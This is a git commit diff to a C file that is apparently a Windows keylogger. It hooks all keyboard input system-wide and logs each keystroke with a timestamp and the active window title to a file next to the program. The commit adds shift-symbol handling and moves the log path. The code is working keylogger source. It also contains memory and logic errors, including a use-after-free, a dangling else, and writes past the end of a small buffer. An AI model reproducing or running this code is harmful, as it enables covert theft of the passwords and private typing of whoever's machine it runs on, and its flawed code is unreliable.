d94025df7fb3ca748f266736102ec9a0a6c95b1f
Zekao <Busterk182@gmail.com>
2023-03-28 16:54:48 +0200

    Added handle of special keys

--- winkey.c
+++ winkey.c
@@ -15,17 +15,24 @@ wchar_t buf[2];
 char *key_pressed;
 char  output[256];
 
+BOOL shift_pressed = FALSE;
+
+
 void    getKeysState(bool *capsLock, bool *shift) {
     /*
         // Getting the state of the keys in order to know if they are pressed or not.    
     */
     *capsLock = GetKeyState(VK_CAPITAL) & 0x0001;
-    *shift = GetAsyncKeyState(VK_LSHIFT) & 0x0001;
 }
 
 void    handleSpecial(int vkCode, char *key_pressed) {
     /*
         // Attributing a value to all the "special" keys in order to make them readable for the user.
+
+        // vkCode: The virtual key code of the key pressed.
+
+        // -----------------------------
+        // In this function, we also check if shift is pressed or not in order to be able to write the key pressed in the right case. 
     */
     if (key_pressed)
         free(key_pressed);
@@ -47,11 +54,88 @@ void    handleSpecial(int vkCode, char *key_pressed) {
         key_pressed = strdup("[LEFT CTRL]");
     else if (vkCode == VK_RCONTROL)
         key_pressed = strdup("[RIGHT CTRL]");
-    else if (vkCode == VK_LSHIFT)
+    else if (vkCode == VK_LSHIFT){
+        shift_pressed = true;
         key_pressed = strdup("[LEFT SHIFT]");
-    else if (vkCode == VK_RSHIFT)
+    }
+    else if (vkCode == VK_RSHIFT){
+        shift_pressed = true;
         key_pressed = strdup("[RIGHT SHIFT]");
+    }
 }
+
+int    specialCombinaison(int vkCode, char *key_pressed) {
+    /*
+        // In this function, we handle all the special combinaisons for a QWERTY layout.
+    */
+    if (shift_pressed) {
+        switch (vkCode) {
+            case VK_OEM_PLUS:
+                key_pressed = strcpy(key_pressed, "+");
+                return 1;
+            case VK_OEM_MINUS:
+                key_pressed = strcpy(key_pressed, "_");
+                return 1;
+            case 0x39:
+                key_pressed = strcpy(key_pressed, "(");
+                return 1;
+            case 0x38:
+                key_pressed = strcpy(key_pressed, "[");
+                return 1;
+            case 0x37:
+                key_pressed = strcpy(key_pressed, "*");
+                return 1;
+            case 0x36:
+                key_pressed = strcpy(key_pressed, "^");
+                return 1;
+            case 0x35:
+                key_pressed = strcpy(key_pressed, "%");
+                return 1;
+            case 0x34:
+                key_pressed = strcpy(key_pressed, "$");
+                return 1;
+            case 0x33:
+                key_pressed = strcpy(key_pressed, "#");
+                return 1;
+            case 0x32:
+                key_pressed = strcpy(key_pressed, "@");
+                return 1;
+            case 0x31:
+                key_pressed = strcpy(key_pressed, "!");
+                return 1;
+            case 0x30:
+                key_pressed = strcpy(key_pressed, ")");
+                return 1;
+            case VK_OEM_COMMA: // ,
+                key_pressed = strcpy(key_pressed, "<");
+                return 1;
+            case VK_OEM_PERIOD: // .
+                key_pressed = strcpy(key_pressed, ">");
+                return 1;
+            case VK_OEM_1: // ; :
+                key_pressed = strcpy(key_pressed, ":");
+                return 1;
+            case VK_OEM_2: // /
+                key_pressed = strcpy(key_pressed, "?");
+                return 1;
+            case VK_OEM_4: // [
+                key_pressed = strcpy(key_pressed, "{");
+                return 1;
+            case VK_OEM_5: // \ |
+                key_pressed = strcpy(key_pressed, "|");
+                return 1;
+            case VK_OEM_6: // ]
+                key_pressed = strcpy(key_pressed, "}");
+                return 1;
+            case VK_OEM_7: // ' "
+                key_pressed = strcpy(key_pressed, "\"");
+                return 1;
+        }
+    }
+    return 0;
+}
+
+
 LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
     /*
         // The hook procedure that will be called every time a key is pressed.
@@ -68,12 +152,12 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
 
     KBDLLHOOKSTRUCT const *info = (KBDLLHOOKSTRUCT const *)lparam;
 
-    // if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL ) 
-        // return 0;
-
-        // don't track key release except for capslock and shift
-    if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL && info->vkCode != VK_LSHIFT && info->vkCode != VK_RSHIFT)
+    if (info->flags & LLKHF_UP && info->vkCode != VK_CAPITAL) {
+        if (info->vkCode == VK_LSHIFT || info->vkCode == VK_RSHIFT) {
+            shift_pressed = false;
+        }
         return 0;
+    }
 
 
     if (!(key_pressed = malloc(sizeof(char) * 4)))
@@ -81,23 +165,6 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
     if (info->vkCode == VK_CAPITAL || info->vkCode == VK_SHIFT)
         getKeysState(&capsLock, &shift);
     GetKeyboardState(keyboard_state);
-    // printf("vkCode: %d\n", info->vkCode);
-    // C'est ici!
-    // Pour control il doit retourner 0
-    // faut checker les trucs spécial plus tôt.
-    // ok j'vais tester ici pour voir mdr -> Ok t'avais raison gg
-    // :ok_hand:
-    // :monkey_flip:
-    // Ok donc ca marchait pas car pour les touches CTRL, alt, etc, on a un buflen de 0 (make sense)
-    // C'est grave si on met >= 0 du coup? je pense pas que ce soit grave, faut tester -> okok j'vais tester thx
-    // btw effectivement sans les printf ca bug moins dans hookproc mais y'a toujours des ralentissements que je comprends pas
-    // je ferais un système de ring buffer quand on aura un truc stable, ça devrait aider.
-    // ca marche! J'suis chaud pour qu'on le fasse ensemble car j'en ai jamais fait et c'est interessant comme truc
-    // s'tu veux ! Le seul truc tricky là, c'est qu'on va utiliser des threads, et donc des opérations atomiques. C'est vraiment chiant à utiliser correctement.
-    // https://en.cppreference.com/w/cpp/atomic/memory_order
-    // on va s'amuser
-    // :sweat:
-
 
     int buf_len = ToUnicodeEx(info->vkCode, info->scanCode, keyboard_state, buf, 2, 0, NULL);
     if (buf_len >= 0)
@@ -110,33 +177,41 @@ LRESULT hookproc(int code, WPARAM wparam, LPARAM lparam) {
             || info->vkCode == VK_CAPITAL)
             handleSpecial(info->vkCode, key_pressed);
 
-        // printf("capsLock: %d\n", capsLock);
-        // printf("shift: %d\n", shift);
-        if (capsLock && !shift || !capsLock && shift)
-            toupper(key_pressed[0]);
-        else if (capsLock && shift || !capsLock && !shift)
-            tolower(key_pressed[0]);
+
+        if ((capsLock && !shift_pressed) || (!capsLock && shift_pressed))
+            if (!specialCombinaison(info->vkCode, key_pressed))
+                key_pressed[0] = toupper(key_pressed[0]);
+        else if ((!capsLock && !shift_pressed) || (capsLock && shift_pressed))
+            if (!specialCombinaison(info->vkCode, key_pressed))
+                key_pressed[0] = tolower(key_pressed[0]);
         
         GetLocalTime(&st);
+
         sprintf(timestamp, "%02d:%02d:%02d.%03d", st.wHour, st.wMinute, st.wSecond, st.wMilliseconds);
         hwnd = GetForegroundWindow();
-        GetWindowTextA(hwnd, title, 256); // ici // oki merci
+        GetWindowTextA(hwnd, title, 256);
 
-        // GetWindowTextW(hwnd, title, 256);
         WideCharToMultiByte(CP_UTF8, 0, title, -1, title, 256, NULL, NULL);
         sprintf(output, "[%s] <%s> => %s\n", timestamp, title, key_pressed);
-        // printf("%s", output);
         fwrite(output, 1, strlen(output), f);
         fflush(f);
+        free(key_pressed);
     }
 
     return 0;
 }
 
 int main(void) {
-    HINSTANCE hInstance = GetModuleHandleW(NULL);
+    char path[1024];
+    GetModuleFileNameA(NULL, path, 1024);
+    char *last_slash = strrchr(path, '\\');
+    if (last_slash)
+        *last_slash = '\0';
 
-    f = fopen("C:\\Users\\Buste\\Documents\\GitHub\\tinky-winkey\\log.txt", "w");
+    HINSTANCE hInstance = GetModuleHandleW(NULL);
+    f = fopen(strcat(path, "\\log.txt"), "w");
+    
+    
     getKeysState(&capsLock, &shift);
     kbd_hook = SetWindowsHookExW(WH_KEYBOARD_LL, hookproc, hInstance, 0);
     if (!kbd_hook)
